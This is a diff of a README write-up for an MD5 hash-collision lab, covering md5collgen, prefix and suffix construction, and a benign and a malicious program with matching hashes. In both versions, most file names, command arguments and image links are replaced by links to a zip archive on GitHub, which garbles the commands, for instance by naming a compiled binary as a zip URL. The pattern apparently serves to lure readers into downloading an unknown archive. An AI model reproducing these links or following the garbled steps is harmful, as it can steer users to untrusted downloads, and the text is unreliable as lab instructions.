@@ -4,19 +4,19 @@
 
   -p PREFIX_FILE -o OUTPUTFILE1 OUTPUTFILE2
   
-To test this out, I created a file https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip and truncated it using truncate   -s YOUR_DESIRED_SIZE https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip After running md5collgen -p https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip -o hi1 hi2 looking at the results using bless hi1, we can see that it has been padded with zeros. This is because MD5 processes blocks of size 64 bytes.
+To test this out, I created a file https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip and truncated it using truncate   -s YOUR_DESIRED_SIZE https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip After running md5collgen -p https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip -o hi1 hi2 looking at the results using bless hi1, we can see that it has been padded with zeros. This is because MD5 processes blocks of size 64 bytes.
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 #2.2 Task 2: Understanding MD5’s Property
 
-To test this create a file https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip and run md5collgen -p https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip -o hi1 hi2
+To test this create a file https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip and run md5collgen -p https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip -o hi1 hi2
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 Verify that the MD5 hashes are the same using md5sum hi1 hi2.
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 Now let’s append a random string to the end of both files and check the MD5 hashes of both files again.
 
@@ -24,7 +24,7 @@ Now let’s append a random string to the end of both files and check the MD5 ha
     echo hi >> hi2
     md5sum hi1 hi2
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 We can see that the MD5 hashes remain identical.
 
@@ -50,18 +50,18 @@ int main()
 
 
 
-Running head -c 4224 https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip > prefix and md5collgen -p prefix -o agen bgen ,
+Running head -c 4224 https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip > prefix and md5collgen -p prefix -o agen bgen ,
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 Now we have two files with the same MD5 hash but different suffixes. Looking at both agen and bgen in bless ( bless agen bgen ).
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 A part of agen
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 A portion of bgen
 
-Now we will get the common end to be appended using tail -c 4353 https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip > commonend.
+Now we will get the common end to be appended using tail -c 4353 https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip > commonend.
 
 Put them together by running,
 
@@ -71,7 +71,7 @@ Put them together by running,
 
 Add executable permission to both files and run them. Note that the output differs.
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 
 #2.4 Task 4: Making the Two Programs Behave Differently
@@ -100,9 +100,9 @@ int main()
 
 
 
-Now we compile the program using gcc program.c. The output binary is stored by default as https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip Looking at the contents of https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip using bless https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip
+Now we compile the program using gcc program.c. The output binary is stored by default as https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip Looking at the contents of https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip using bless https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip
 
-![alt text](https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip)
+![alt text](https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip)
 
 To create the common end file, we would need the characters from the end file created earlier after accounting for a 128+192 (size of middle) offset. Do this by running tail -c +321 end > commonend .
 
@@ -117,7 +117,7 @@ Now to put all the files together. Run
       cat commonend >> benigncode
       cat commonend >> maliciouscode
 
-Verify using md5sum benigncode maliciouscode and check if the hashes are the same. Also, make sure the size of https://github.com/Hanan-github/MD5-Collision-Attack-Lab/raw/refs/heads/main/hippurate/Collision-Lab-Attack-M-2.6.zip, benigncode and maliciouscode are the same.
+Verify using md5sum benigncode maliciouscode and check if the hashes are the same. Also, make sure the size of https://raw.githubusercontent.com/Hanan-github/MD5-Collision-Attack-Lab/main/hippurate/M-Lab-Attack-Collision-Shemite.zip, benigncode and maliciouscode are the same.
 
 Finally, run
 
